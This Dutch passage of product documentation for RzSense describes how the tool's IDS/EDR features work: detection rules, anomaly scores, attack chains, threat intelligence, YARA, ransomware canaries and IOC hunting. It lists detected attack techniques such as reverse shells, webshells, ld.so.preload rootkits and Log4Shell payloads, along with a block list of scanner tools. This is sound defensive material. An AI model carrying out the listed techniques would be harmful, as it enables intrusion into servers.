  `/dev/shm` of een verborgen map, cryptominers, history wissen, SUID zetten, SSH-sleutels, uitbreken uit een container,
  kernelmodules, `ld.so.preload`, nieuwe cron/systemd/ssh-bestanden en meer;
- de **Linux-regels van [SigmaHQ](https://github.com/SigmaHQ/sigma)** (*medium* en hoger; licentie DRL 1.1, de maker
  staat bij elke treffer). *medium* wordt 🟠, *high* 🔴, *critical* 🔴 en het proces stoppen.
- Alle regels staan bij *Instellingen → IDS en EDR → Endpoint-bewaking (EDR) → Regels en uitzonderingen*, met hoe vaak
  ze de laatste 3 dagen raak waren. Daar zet je een regel uit **voor alle servers**; *Dit is normaal* bij een incident
  geldt voor **één server**.

**Een treffer** wordt een IDS-incident met het bewijs in het blok **Inspectie**: programma, opdracht, ouder, gebruiker,
verbinding of bestand, de MITRE ATT&CK-technieken en wat RzSense deed.

**Zelf ingrijpen** (alleen in de modus ⛔ Blokkeren; elk los aan of uit):
- **Proces stoppen** bij een regel die dat zegt (webshell, reverse shell, cryptominer …). De agent controleert eerst dat
  het nog hetzelfde proces is (pid en starttijd) en meldt of het lukte.
- **IP blokkeren** bij een webaanval met een herkende payload.
- **Server isoleren** (24 uur) bij een reverse shell of cryptominer.

**Payload-inspectie**: de agent stuurt verdachte webverzoeken mee (wachtwoorden en tokens weggelakt). RzSense decodeert ze
en herkent SQL-injectie, XSS, command injection, path traversal, PHP-wrappers, RFI, Log4Shell, SSRF, Shellshock, SSTI,
PHP-code en OGNL, bekende exploits met hun CVE (bv. `eval-stdin.php` = CVE-2017-9841) en scanners. Eén incident per IP,
met de laatste 10 verzoeken en het verdachte stuk gemarkeerd.

### Live

*IDS → 🛰️ Live* toont wat de agents de laatste 3 dagen zagen, live bijgewerkt. Bovenaan een oordeel met de laatste 24
uur per uur. Kies **Aandacht** (alleen treffers, standaard), **Alles** of **Toegestaan** (RzSense zelf en uitzonderingen).
Herhalingen worden samengevoegd (*48×*). Een treffer klapt open met *Wat betekent dit?*, *Wat kun je doen?*, **Bekijk
incident**, **Proces stoppen** (alleen een proces dat de agent meldde, nooit iets van RzSense), **Dit is normaal** en
AI-advies.

### Aanzetten

1. *Instellingen → IDS en EDR → Endpoint-bewaking (EDR) → Bewaking*: de bewaking zelf, de Sigma-regels, de
   payload-inspectie en de drie acties. Standaard aan zodra het IDS aan staat.
2. Per server: in de Agent Manager, *🛡️ Endpoint-bewaking* (standaard aan). Daar zie je ook welke sensoren werken.
3. Ontbreekt `auditd` of `inotify-tools`, dan zie je dat onder de servernaam (*🛡️ ontbreekt: auditd · installeren?*).
   Klik erop voor het commando, of kies **Installeren via de agent** (beheerders; typ `INSTALLEREN` en je wachtwoord;
   alleen als commando's als root aan staan). Op Rocky/Alma komt `inotify-tools` uit EPEL; dat wordt eerst geïnstalleerd.

Op de server zelf zet `EDR=0` in `/etc/default/rzmon-agent` het altijd uit.

### Goed om te weten

- De agent zet eigen `auditd`-regels (sleutels `rzmon_*`), alleen zolang het aan staat, en na een herstart opnieuw. Staat
  `auditd` op slot (`-e 2`), dan werken ze pas na een herstart.
- Op een drukke server wordt het audit-log groter. De agent stuurt dubbele gebeurtenissen hooguit één keer per 10 minuten
  door en hooguit 200 per minuut.
- De sensoren draaien in de realtime-watcher (`rzmon-watch`), dus alleen met systemd. Niet in de Home Assistant-add-on en
  niet op TrueNAS SCALE; op Alpine zonder systemd alleen bij de gewone runs.
- Een webapplicatie die zelf `exec()` gebruikt, kan de regel *webshell* raken. Klik dan *Dit is normaal*.
- Gebeurtenissen worden 3 dagen bewaard, wat een server normaal doet 60 dagen, en de meldingen voor ketens en MITRE 90
  dagen.

## Afwijkingen, ketens en MITRE

Bovenop de regels leert RzSense per server wat normaal is, en kijkt het of losse meldingen samen een aanval vormen.
Instellen bij *Instellingen → IDS en EDR → Endpoint-bewaking (EDR) → Bewaking → 🧬 Afwijkingen en ketens*.

### Afwijkingen

**Leren** (standaard 14 dagen): RzSense onthoudt per server welke programma's draaien en wie ze start, welke gebruikers
actief zijn, wat luistert en naar buiten verbindt (en naar welke landen), welke bestanden, paden en container-images er
zijn, en hoeveel er per uur gebeurt. Op *IDS → Analyse → 🧬 Afwijkingen* zie je per server *dag 5 van 14* of *klaar*. Met
**Leren afronden** stop je eerder; met **↺ Opnieuw leren** begint een server opnieuw.

Na de leerperiode krijgt alles wat een server nog nooit deed een score:

| Afwijking | Score |
|---|---|
| Een dienst (nginx, PHP, database, sshd …) start iets nieuws | 40 |
| Nieuw programma dat luistert op het netwerk | 45 |
| Een dienst maakt een nieuwe verbinding naar buiten | 40 |
| Iemand voor het eerst actief na inloggen | 40 |
| Nieuwe gebruiker die programma's uitvoert | 35 |
| Nieuw programma buiten de systeemmappen; nieuw programmabestand | 35 |
| Eerste verbinding naar een nieuw land | 30 |
| Activiteit op een ongewoon uur; ongewoon veel nieuwe processen of verbindingen | 30 |
| Nieuw bewaakt pad aangeraakt; nieuw container-image | 25–30 |
| Nieuw systeemprogramma, nieuwe uitgaande poort, nieuw bestand | 10–20 |

Vanaf **score 40** (instelbaar) wordt een afwijking een 🟠 incident; lager staat hij alleen op de pagina. Wat al door een
regel gemeld is, telt niet nog eens. Wat eenmaal gemeld is, is geleerd.

**Updates zijn geen aanval.** Tijdens een update met dnf, yum, rpm of apt, en een kwartier erna (*Rustig na een update*,
0 tot 120 minuten), tellen de programma's en verbindingen van het pakketbeheer niet als afwijking. De tijdelijke mappen
van dracut, rpm, dnf en apt tellen nooit als nieuw bestand. Een programma in `/tmp` dat niet van het pakketbeheer komt,
blijft verdacht.

### Ketens

Na elk rapport kijkt RzSense of de meldingen van die server in het laatste uur (instelbaar) samen het verloop van een
aanval vormen. Alle meldingen tellen mee: regeltreffers, afwijkingen en gewone IDS-incidenten.

| Keten | Ernst | Wat RzSense doet (modus Blokkeren) |
|---|---|---|
| Webaanval gevolgd door code op de webserver | 🔴 | aanvaller(s) blokkeren; isoleren als er een critical treffer bij zat (zoals een webshell) |
| Inloggen gevolgd door rechten of een achterdeur (sudoers, nieuwe gebruiker, cron, systemd, SSH-sleutel) | 🔴 bij een verdachte login, anders 🟠 | alleen melden |
| Programma binnengehaald en daarna contact naar buiten | 🔴 | het IP van de bestemming blokkeren en isoleren |
| Meerdere stappen van een aanval (3 of meer MITRE-tactieken) | 🔴 | alleen melden |
| Veel afwijkingen tegelijk | 🟠 | alleen melden |
| Mogelijk verder het netwerk in (SSH-login vanaf een eigen server waar net een aanval was) | 🔴 | alleen melden |

- Een keten wordt een incident met **alle stappen in volgorde**. Ingrijpen gebeurt één keer; *Ingrijpen bij een keten*
  zet je los uit.
- *Ja, dit was ik* bij een keten: die soort keten wordt voor die server niet meer gemeld.

**Isoleren bij een keten:**
- **Eerst vragen** (aangeraden, standaard): je krijgt een melding met hoge prioriteit, en bovenaan elke pagina staat een
  balk *"web-01 isoleren?"* met **🧱 Nu isoleren**, **Hoort zo** (met je wachtwoord) en een afteller. Kiest niemand binnen
  de **wachttijd** (standaard 10 minuten), dan isoleert RzSense alsnog, of meldt alleen als je *Geen antwoord: dan alleen
  melden* kiest.
- **Meteen**: zonder te vragen. Tijdens een update vraagt RzSense toch eerst.
- **Alleen melden**: nooit automatisch isoleren.
- Een server in **onderhoud** wordt nooit automatisch geïsoleerd. Een **reverse shell**, **cryptominer** of
  **ransomware** isoleert altijd meteen: die gaan niet via een keten.

### MITRE

*IDS → Analyse → 🧭 MITRE* toont alle meldingen van 7, 30 of 90 dagen in de matrix van
[MITRE ATT&CK](https://attack.mitre.org): per stap van een aanval de technieken die gezien zijn, hoe vaak en hoe ernstig.
Klik op een techniek voor de meldingen. **Ook wat de regels kunnen zien** toont ook de technieken die nog niet voorkwamen
(de dekking).

## Aanvalskaart

*IDS → 🗺️ Aanvalskaart* laat in één oogopslag zien waar een aanval vandaan komt, wat er aangevallen wordt, via welke
dienst of poort, en of het IP geblokkeerd is.

- **Filters**: periode (*Nu (15 min)*, 1 uur, 24 uur, 7 of 30 dagen), server, land, soort aanval en richting (*Beide*,
  *Inkomend*, *Uitgaand*). Kies **Attack Flow** of **Wereldkaart**.
- **Bovenaan** drie kaarten: **Grootste aanvaller nu** (land, IP, dienst, server, gebruikersnamen, pogingen per minuut
  en wat het IDS deed, met **Overal blokkeren**), **Nu bezig** en **IDS-acties · laatste uur**.
- **Live Attack Flow**: links de aanvallers (met label *BLOK*, *OPEN* of *INGELOGD*), rechts je servers en apparaten,
  met lijnen ertussen waarop de dienst, poort en het aantal staan (*SSH · TCP/22 · 312×*). Er staan altijd tien
  aanvallers: eerst wie nu aanvalt, aangevuld met de grootste van de periode (gedimd). Bewegende deeltjes betekenen dat er
  nu pogingen zijn; een **groen schild** = geblokkeerd; een **rode ring** om een server = nu geraakt door een aanvaller die
  nog niet geblokkeerd is; **paars** = uitgaand of vanaf een eigen server. Een **stippellijn** is een verband dat RzSense
  afleidt (keten, dreigingsinformatie), geen gezien verkeer; zet *Afgeleide verbanden tonen* uit om alleen echt verkeer te
  zien. Hoeveel beweging je wilt, stel je in bij *Mijn account → Weergave*.
- **🕒 Tijdlijn**: een baan per aanvaller, met **▶ Afspelen** en **⏭ Stap**.
- **Live gebeurtenissen**: een lopende band met wat er net gebeurde. Zet de muis erop om hem stil te zetten.
- **Top 10 aanvallen** en, bij de wereldkaart, de herkomst per land. Het land is waar het IP geregistreerd staat. De kaart
  zit in RzSense zelf; er gaat niets naar een kaartdienst.
- **Klik op een aanvaller, dienst of afloop** voor een venster met **In het kort** in gewone taal, en de tabbladen
  *Overzicht*, *Gebeurtenissen*, *Tijdlijn van het IP* en *Over het IP-adres*.
- Op een telefoon staan de lijnen als lijst. Op het dashboard staat een kaartje *Aanvallen (24 uur)*.

## Dreigingsinformatie

RzSense zoekt op wat er op internet bekend is over de IP-adressen en bestanden uit je incidenten, en handelt ernaar.
Instellen bij *Instellingen → IDS en EDR → Dreigingsinformatie*.

| Bron | Wat | Nodig |
|---|---|---|
| **AbuseIPDB** | hoe vaak een IP gemeld is, door hoeveel mensen, soort netwerk | gratis API-sleutel ([abuseipdb.com → Account → API](https://www.abuseipdb.com/account/api)), 1.000 per dag |
| **GreyNoise** | scant dit IP het hele internet, is het een bekende dienst, onschuldig of kwaadaardig | niets (ongeveer 50 per dag) |
| **Shodan InternetDB** | open poorten, lekken en labels van het IP | niets |
| **CIRCL hashlookup** | is een nieuw programma een bekend, goed bestand | niets |
| **abuse.ch Feodo Tracker** en **URLhaus** | botnet-servers; domeinen met malware (voor de DNS-controle) | niets |
| **abuse.ch MalwareBazaar** en **ThreatFox** | bekende malware per bestand; adressen en domeinen van botnets | gratis Auth-Key ([auth.abuse.ch](https://auth.abuse.ch/)) |
| **Tor-uitgangen** | dagelijkse lijst van het Tor Project; als je wilt ook vooraf blokkeren | niets |

Plak een sleutel in het veld en klik **Sleutel testen**.

- **Wanneer**: bij elk nieuw incident met een IP van buiten, bij een nieuwe verbinding naar buiten en bij elk nieuw
  programma of script. Op de achtergrond, met een cache van een dag (bestanden een week). Alleen het IP-adres of de hash
  gaat naar buiten.
- **Oordeel**: een score van 0 tot 100 en een soort: ☠️ bekende aanvaller (vanaf 80, instelbaar), ⚠️ verdacht,
  🤖 scanner, ✔ onschuldig, 🧅 Tor. Het staat bij het incident, met links naar AbuseIPDB, GreyNoise en Shodan.
- **Wat RzSense ermee doet** (elk los aan of uit):
  - een bekende aanvaller **blokkeren** (modus Blokkeren);
  - een **login** vanaf een bekende aanvaller wordt critical;
  - een webaanval van een **onschuldige scanner** (bv. Shodan, Censys) vanzelf afhandelen;
  - een webaanval op een **lek dat de server echt heeft** (volgens Kwetsbaarheden) is critical, met de versie die het
    oplost.
  - Altijd: een verbinding naar een **botnet-server** is meteen critical (in de modus Blokkeren wordt het proces gestopt);
    een bestand dat als **malware** bekend is, wordt een critical incident; een bekend goed bestand krijgt
    *✔ bekend bestand*.
- **Melden bij AbuseIPDB** (standaard uit): wie RzSense automatisch blokkeert, gaat naar AbuseIPDB, hooguit één keer per
  dag per IP, met alleen het IP-adres, de soort aanval en de tekst *RzSense IDS*. Nooit adressen uit je eigen netwerk of
  van de whitelist.
- Onderaan de kaart zie je hoeveel er vandaag is opgezocht, wanneer de lijsten zijn bijgewerkt (**Lijsten nu
  bijwerken**) en of een bron een fout gaf. Een bron die "te veel" of "sleutel geweigerd" antwoordt, wordt een tijd
  overgeslagen.

## DNS, Suricata en YARA

Instellen bij *Instellingen → IDS en EDR → DNS, Suricata en YARA*.

### DNS-controle via AdGuard Home

Standaard aan zodra AdGuard gekoppeld is (*Instellingen → Netwerk → AdGuard Home*). Elke minuut leest RzSense
de query-log van je AdGuard-instanties. Zo zie je **elk apparaat**, ook zonder agent (tv, camera's, IoT):

- een domein dat bij URLhaus of ThreatFox bekend is: 🔴 als AdGuard het doorliet, 🟠 als AdGuard het tegenhield;
- een domein dat AdGuard Safe Browsing tegenhield (malware, phishing);
- een antwoord dat naar een bekende aanvaller wijst;
- een mogelijke **DNS-tunnel** (40 of meer lange, unieke namen onder één domein) en **verzonnen domeinen** (30 of meer
  willekeurige namen die niet bestaan): 🟠. CDN's, clouddiensten, omgekeerde DNS en Plex tellen niet mee.

Is het apparaat een van je servers, dan staat het incident bij die server (en telt het mee voor ketens); anders bij
RzSense zelf, met de naam uit AdGuard. Er gaat niets naar buiten.

**Nieuw geregistreerde domeinen** (standaard uit): vraagt een apparaat een domein op dat jonger is dan 30 dagen
(instelbaar), dan krijg je een warning. Phishing en malware gebruiken vaak gloednieuwe domeinen. RzSense zoekt elk
hoofddomein één keer op via RDAP; de domeinnaam gaat dan naar de RDAP-server van de registry. Daarom staat het uit.

### Suricata op een server

Draait [Suricata](https://suricata.io) op een server, dan stuurt de agent de nieuwe alerts uit
`/var/log/suricata/eve.json` mee. Ander pad: `SURICATA_EVE=…`; uit: `SURICATA=0` in `/etc/default/rzmon-agent`.

- Ernst 1 wordt 🔴, ernst 2 🟠, ernst 3 alleen een signaal (afwijkingen, MITRE). Elk alert telt mee voor de ketens.
- **Blokkeren**: bij ernst 1 van buiten blokkeert RzSense de aanvaller (modus Blokkeren). Met **Blokkeren vanaf ernst**
  op 2 blokkeert RzSense ook bij ernst 2, maar alleen bij slechte reputatie (bv. CINS, DShield), scans en aanvallen.

### YARA

Staat `yara` op een server, dan controleert de agent elk nieuw bestand in de tijdelijke mappen en elk nieuw script in de
webmappen met de YARA-regels die RzSense (versleuteld) meestuurt. Ze herkennen PHP- en JSP-webshells, cryptominers,
reverse shells, IoT-botnets (Mirai, Gafgyt), Kinsing, LD_PRELOAD-rootkits en download-en-start-scripts (🔴), en ingepakte
of sterk versleutelde bestanden (🟠). Installeren via de Agent Manager (*⬇ Installeren via de agent*) of zelf
(`apt install yara`; op Rocky/Alma uit EPEL).

### AdGuard-blokkadelijst

RzSense maakt een filterlijst voor AdGuard Home, zodat bekende malwaredomeinen in je **hele netwerk** geblokkeerd worden.

1. Zet bij *Instellingen → IDS en EDR → DNS, Suricata en YARA → AdGuard-blokkadelijst* de lijst aan en kies wat erin
   komt: malwaredomeinen uit de dreigingsinformatie (URLhaus, ThreatFox), je **bewaakte domeinen** (*IDS → Jagen*) en
   **eigen domeinen**.
2. Klik **Toevoegen aan AdGuard** (als AdGuard gekoppeld is), of plak de **geheime URL** in AdGuard bij *Filters →
   DNS-blokkadelijsten → Blokkadelijst toevoegen → Eigen lijst*. De URL werkt alleen vanaf je lokale netwerk.

*Nooit blokkeren* en het adres van RzSense zelf komen er nooit in. Met **Nieuwe geheime URL** maak je de oude onbruikbaar.

## RzSense zelf: toegestaan

Wat RzSense zelf doet, houdt het IDS nooit tegen. Het wordt wel gelogd, als groene regel *✔ toegestaan* in *Live*.

- **Wat telt als RzSense**: de agent en alles wat hij start, RzSense op zijn eigen server (webinterface, API, cron) en
  het verkeer tussen agent en RzSense, inclusief de checks en de netwerkscan.
- Daarvoor geldt: geen proces stoppen, niets blokkeren of isoleren, geen incident, en het telt niet mee voor afwijkingen,
  ketens of dreigingsinformatie.
- Een programma dat zich "rzmon-agent" noemt maar van een gewone gebruiker is, telt niet als RzSense. Zet op de
  RzSense-server geen andere websites onder dezelfde gebruiker in de map van RzSense.

## Uitzonderingen

Wat in een bepaalde situatie normaal is, leg je vast bij *Instellingen → IDS en EDR → Endpoint-bewaking (EDR) → Regels en
uitzonderingen → 🛡️ Uitzonderingen*. Wat op een uitzondering past: **geen melding**, **niet ingrijpen**, en het telt
**niet mee** voor afwijkingen en ketens. Je ziet het wel als groene regel *✔ toegestaan · uitzondering: naam* in *Live*.

**Een uitzondering maken:**
1. **Soort**: *endpoint-bewaking* (processen, bestanden, netwerk, containers) of *IDS* (logins, uitgaand verkeer, webshell,
   bewaakte bestanden).
2. **Regel**: één regel of soort melding, of alle.
3. **Geldt voor**: alle servers, een groep (soort apparaat) of één server.
4. **Voorwaarden**: *programma*, *ouderproces*, *gebruiker*, *opdracht bevat*, *pad*, *IP-adres of netwerk*, *poort*,
   *container*, *tekst bevat*. Alles wat je invult moet kloppen. Jokers: `*` binnen een map, `**` ook dieper
   (`/var/tmp/dracut.*/**`). Een programma zonder `/` vergelijkt alleen de naam (`sed`).
5. **Geldig**: altijd, of 1, 7 of 30 dagen; met een **reden**.

Bij elke uitzondering zie je hoe vaak en wanneer hij voor het laatst raak was.

**Sets** (één knop voor een hele groep): *🔧 Systeemonderhoud* (pakketbeheer, dracut, logrotatie …), *📦 Containers*,
*🎬 Plex* en *☁️ Back-up naar de cloud* (rclone, restic, borg, kopia). Je ziet per regel hoe vaak hij de laatste 30
dagen raak zou zijn. **Weghalen** haalt de hele set weg.

**Voorstellen uit je meldingen**: wat de laatste 30 dagen vaak terugkwam, met hoe vaak en op welke servers. Wat 20× of
vaker voorkwam, staat al aangevinkt; **＋ Geselecteerde toevoegen** voegt ze in één keer toe. Verdachte processen en
wijzigingen aan gevoelige bestanden worden nooit voorgesteld.

**Goed om te weten:**
- **Nooit uit te zonderen**: malware (YARA), programma's in `/dev/shm` of verborgen mappen, lokaas, bekende kwade adressen,
  aanvallen op je webserver en ketens. Een uitzondering zonder voorwaarden kan niet.
- Aanmaken, aanzetten, sets, voorstellen en importeren vragen je **wachtwoord** (op je LAN zonder account: `UITZONDEREN`)
  en komen in het logboek. Uitzetten en weghalen mag zonder.
- **⇩ Exporteren / ⇧ Importeren** als JSON, bijvoorbeeld naar een tweede RzSense. Servers staan erin op naam.
- *Dit is normaal* bij een incident blijft werken voor dat ene geval op die server.

## Beschermingen: alles op een rij

*Instellingen → IDS en EDR → Beschermingen* toont alles wat het IDS doet als kaarten in groepen (Inloggen, Web, Processen
en bestanden, Netwerk en DNS, Afwijkingen en ketens, Dreigingsinformatie). Per kaart:

- wat het ziet en de drempel (*meer dan 10 mislukte SSH-logins binnen 10 minuten*);
- de ernst en de actie: 🔔 alleen melden, 🚫 IP blokkeren, ⛔ proces stoppen, 🧱 server isoleren, ✔ vanzelf afhandelen,
  🚫 vooraf blokkeren. In de modus Leren zijn de acties doorgestreept;
- een **schakelaar** en **⚙️ Drempels** (beheerders). Dit is de plek om beschermingen aan of uit te zetten;
- hoe vaak het de laatste 7 dagen raak was, met **Toon incidenten**;
- een ⚠️ als het ergens niet werkt (auditd ontbreekt, geen AbuseIPDB-sleutel, AdGuard niet gekoppeld).

Bovenaan staat de modus met een knop om te wisselen.

## Ransomware herkennen

Ransomware versleutelt je bestanden en vraagt losgeld. Hoe eerder je het ziet, hoe minder er kwijt is. RzSense let er per
server op, in de mappen die jij kiest; vooral je **shares**, want daar komt ransomware van een besmette pc het eerst.

**Aanzetten:** open de Agent Manager van de server, kaart **🧬 Ransomware**. De agent stelt je Samba-shares, NFS-exports,
de shares van TrueNAS en `/home` voor. Vink aan wat je wilt bewaken, of vul zelf een map in. De agent moet als root
draaien (niet in de Home Assistant-add-on).

**Wat de agent elke ronde doet:**
- **🪤 Lokaasbestanden**: in elke map twee bestanden (`!0-RzSense-lokaas-niet-aanraken.txt` vooraan en `zz-…` achteraan,
  want ransomware werkt vaak op alfabet). Gewijzigd, hernoemd of weg = meteen alarm. Ook als iemand ze per ongeluk
  weggooit, dus vertel het je huisgenoten of collega's.
- **Hoeveel er tegelijk verandert** (ook hernoemen). RzSense leert per map wat normaal is en zet de drempel op het
  hoogste van *Heel veel tegelijk vanaf* (standaard 300) en 4× wat normaal is.
- **Kenmerken**: bekende ransomware-extensies (`.lockbit`, `.encrypted`, `.akira` …), losgeldbriefjes
  (`HOW_TO_DECRYPT` …) en tekstbestanden die ineens niet meer te comprimeren zijn.

**Oordeel:**

| Wat de agent ziet | Gevolg |
|---|---|
| Lokaas geraakt, meerdere kenmerken, of heel veel tegelijk mét een kenmerk | 🔴 *Mogelijke ransomware*, plus wat je per server aanzette |
| Alleen heel veel tegelijk, zonder kenmerken | 🟠 *Heel veel bestanden tegelijk gewijzigd* (vaak een back-up of synchronisatie) |

Per server aan te zetten:
- **📸 Snapshot** (standaard aan): meteen een ZFS-snapshot (`dataset@rzsense-ransom-…`, ook op TrueNAS) of een
  alleen-lezen btrfs-snapshot, hooguit één per half uur.
- **⛔ Processen stoppen** (standaard uit; aanzetten vraagt je wachtwoord): de processen die in de map schrijven worden
  gestopt. Bij Samba is dat de sessie van die pc, en het IP van die pc wordt meteen geblokkeerd.

Alles staat in het logboek van de server. **Uitzetten**: per server de mappen uitvinken (de agent haalt het lokaas weg,
als het nog ongewijzigd is), voor alles bij *Instellingen → IDS en EDR → Ransomware*, of op de server `RANSOM=0` in
`/etc/default/rzmon-agent`.

Dit is een vangnet, geen vervanging van **back-ups**. Een snapshot staat op dezelfde schijf; zorg ook voor een back-up op
een andere plek.

## Onbekende programma's

Een aanvaller zet vaak een eigen programma op je server: een cryptominer, een achterdeur, een scanner. RzSense houdt bij
welke programma's er draaien en laat het weten als er een onbekend programma bij komt.

**Hoe het werkt:** de agent meldt elk programma dat draait één keer, met een **vingerafdruk** (sha256) en het **pakket**
waar het bij hoort. Programma's in containers tellen niet mee.
- **Uit een pakket** (rpm, dpkg, apk, pacman, snap, flatpak, nix): goed.
- **Leerperiode** (standaard 7 dagen): wat er dan draait, geldt als normaal.
- Daarna: een programma **zonder pakket** dat je niet toestond = 🟠 *Onbekend programma*. De vingerafdruk gaat naar de
  dreigingsinformatie; bekende malware = 🔴.
- Een programma zonder pakket met ineens een **andere vingerafdruk** = 🟠 *Programma veranderd*.

**Beslissen** in *IDS → Meer → 🧩 Programma's* (of in de Agent Manager): **✔ Toestaan** of **⛔ Blokkeren**, op de
vingerafdruk, het pad of (bij toestaan) de hele map, voor deze server of alle servers. Onder *Wat je besliste* draai je een
keuze terug.

**Blokkeren**: draait een geblokkeerd programma, dan krijg je een critical incident. Zet je per server **Geblokkeerde
programma's stoppen** aan (Agent Manager, met je wachtwoord), dan stopt de agent het meteen. Systeemprocessen nooit, en een
hele systeemmap (`/usr/`, `/bin/` …) blokkeren kan niet.

**Aan/uit**: *Instellingen → IDS en EDR → Programma's* (met de leerperiode), per server in de Agent Manager, of op de
server `APPCTL=0` in `/etc/default/rzmon-agent`.

Scripts (Python, bash) zie je als hun interpreter (`python3`, `bash`). Dit is dus een lichte vorm van *application
control*: het vangt vreemde programma's, niet elk script.

## Jagen op sporen

Krijg je een waarschuwing met **sporen** (IOC's: IP-adressen, domeinen, vingerafdrukken, paden), bijvoorbeeld van het NCSC
of een leverancier? Zoek dan in één keer of ze bij jou voorkomen, op *IDS → Meer → 🔎 Jagen*.

1. Plak de sporen in het vak. Onschadelijk gemaakte schrijfwijzen werken ook (`1.2.3[.]4`, `hxxps://evil[.]com/…`); een
   URL wordt het domein. Alleen sha256; md5 en sha1 worden overgeslagen.
2. Kies de periode (7 tot 365 dagen) en of de **servers ook zelf zoeken** (paden en vingerafdrukken).
3. Klik **🔎 Zoeken**. Per spoor zie je waar het voorkwam: IDS-incidenten, SSH-logins en -pogingen, blokkades,
   inlogpogingen op RzSense, aanvallen op je websites, EDR, programma's en logs. Een spoor dat bij de dreigingsinformatie
   bekend is, krijgt ☣.
4. Op de servers zoekt elke agent bij zijn volgende ronde of de paden bestaan en of een draaiend programma of een bestand
   in `/tmp`, `/var/tmp`, `/dev/shm`, `/usr/local`, `/opt`, `/root`, `/home`, `/srv` of `/var/www` die vingerafdruk heeft
   (hooguit 2 minuten, lage voorrang). Een treffer is een critical incident.

**👁 Bewaken**: zet de sporen op een lijst. Elke 10 minuten vergelijkt RzSense wat er nieuw binnenkwam; een treffer is een
critical incident *Bewaakt spoor gezien*. Bewaakte domeinen kunnen ook in de
[AdGuard-blokkadelijst](#adguard-blokkadelijst).

Eerdere jachten blijven 180 dagen staan. Er gaat niets naar buiten. Alleen beheerders kunnen zoeken en bewaken.
**Aan/uit**: *Instellingen → IDS en EDR → IDS algemeen*.

## Tijdelijk sudo

Moet iemand even iets als root doen? Geef die gebruiker dan **tijdelijk** sudo in plaats van altijd. Minder accounts met
blijvende rechten betekent minder kans op misbruik.

1. Open de Agent Manager van de server, kaart **🔑 Tijdelijk sudo**, en kies **Tijdelijk sudo geven**.
2. **Gebruiker**: de naam op de server (RzSense stelt gebruikers voor die eerder via SSH inlogden). Root kan niet.
3. **Hoe lang**: 15 minuten tot 4 uur (standaard 30 minuten).
4. **Waarom**: verplicht, komt in het logboek.
5. Bevestig met je **wachtwoord** (altijd) en, als je tweestapsverificatie hebt, je **2FA-code**.

**Wat de agent doet**: hij zet een eigen bestand `/etc/sudoers.d/rzsense-jit-<gebruiker>` neer (eerst gecontroleerd met
`visudo`) en een **systemd-timer** die het op tijd weghaalt, ook als de agent stopt. Andere sudo-regels raakt hij nooit
aan.

**Intrekken** met de knop bij de aanvraag. **Overzicht** van alle aanvragen, en het maximum, bij *Instellingen → Agents en
koppelingen → Tijdelijk sudo*. **Uitzetten**: daar, of op de server `SUDO_JIT=0` in `/etc/default/rzmon-agent`. De agent
moet als root draaien en `visudo` (pakket sudo) moet er zijn.

## Reverse proxy beschermen

Bescherm de apps achter je reverse proxy (**SWAG** of **Nginx Proxy Manager**, in Podman of Docker). Je stelt alles in
RzSense in; de agent op de proxyserver voert het door. Traefik en Caddy worden herkend, maar nog niet ondersteund.

### Aanzetten

1. Ga naar *Instellingen → Web en buitenkant → Reverse proxy en WAF*. Zet de **hoofdschakelaar** aan, en bij **Welke server is
   de reverse proxy?** de rol bij de server waar je proxy draait. Alleen daar doet de agent iets.
2. Bij zijn volgende ronde zoekt de agent de proxy (eerst Podman, dan Docker) en leest de sites uit: SWAG uit
   `proxy-confs/*.conf` en `site-confs/*.conf`, NPM uit `proxy_host/*.conf`.
3. Open de pagina **Reverse proxy** in de zijbalk. Pas per site het beleid aan; de agent voert het binnen een minuut door.

Bovenaan de instellingen staat **✨ Advies voor alle velden**: **Advies invullen** stelt voor elk veld de beste waarde voor,
met een reden. Met AI-advies aan kiest de AI (label 🤖 AI, alleen uit vaste keuzes, door RzSense gecontroleerd); anders
vult RzSense **standaardwaarden** in (hoofdschakelaar aan, beheerpagina's alleen vanaf je netwerk, rate limit normaal,
bots weren, WAF eerst twee weken op *detecteren*, niet delen met CrowdSec, ClamAV aan als er genoeg geheugen is). Neem het
over met **Invullen** of **Alles invullen**, en pas daarna gewoon zelf aan.

### De pagina Reverse proxy

- **Overzicht**: statistieken, de score van de proxy (A tot D), hoeveel sites afgeschermd zijn, de sites die **aandacht**
  vragen (met *Advies toepassen* en *Bekijken*), en het AI-advies.
- **Sites**: per site wie erbij mag, de bescherming, de score en de webcheck. Zoek, of filter op *Aandacht*,
  *Afgeschermd*, *Open voor iedereen* of *Uit*. Klik op een site voor het zijpaneel met alle instellingen en
  *Terug naar de standaard*.
- **WAF**, **Paden dicht**, **Malware-scan** en **Netwerk-IDS**: een eigen tabblad per onderdeel dat aan staat.

### Per site

| Instelling | Keuzes |
|---|---|
| **Wie mag erbij** | *Iedereen*, *Adminpaden alleen mijn netwerk* (bv. `/admin`, ook `/Admin` en `/admin/…`), *Hele site alleen mijn netwerk*. Van buiten krijgt men **403**. |
| **Rate limit** | *Uit*, *Ruim (apps)* (50 per seconde per adres, pieken tot 300; inlogpaden houden *Normaal*), *Normaal* (20 per seconde, pieken tot 40), *Streng* (5 per seconde, pieken tot 20). Te veel = **429**. |
| **Bots weren** | bekende aanvalstools en scanners (sqlmap, nikto, nuclei, zgrab, wpscan …) krijgen 403 |
| **Toegestane apparaten** | je toegestane apparaten van RzSense komen van buiten bij deze site, ook als hij alleen vanaf je netwerk mag, zonder rate limit |
| **WAF** | *Standaard (slider)*, *Alleen melden* of *Uit* |

- **Standaard**: een site die je niet zelf instelde, krijgt de standaard. Bekende beheerprogramma's (Portainer, AdGuard,
  Pi-hole, UniFi, Proxmox, Cockpit, phpMyAdmin …) worden dan helemaal alleen-LAN; bekende apps alleen hun adminpaden
  (Vaultwarden `/admin`, Nextcloud `/settings/admin`, WordPress `/wp-admin` …). Apps met een mobiele app of synchronisatie
  (Home Assistant, Nextcloud, Jellyfin, Plex, Immich, Vaultwarden, Syncthing …) krijgen vanzelf *Ruim (apps)*. Met ↺ zet
  je een site terug.
- Vaste bestanden (scripts, opmaak, afbeeldingen, lettertypes, `/static/` …) tellen nooit mee voor de rate limit.
- **Mijn netwerk** = je *Lokale netwerken*, de whitelist en de **extra netwerken** (bv. je VPN). Daarvandaan wordt nooit
  iets tegengehouden.
- **Toegestane apparaten** werkt met een sleutel (cookie) die het apparaat krijgt als het RzSense opent; hij geldt voor
  het hele domein van RzSense. Op iPhone en iPad zijn Safari en de app op je beginscherm twee aparte apparaten: sta ze
  allebei toe. Hoe dat werkt en hoe je controleert of je sleutel er is, staat bij
  [Toegang en beheer](11-toegang-en-beheer.md).

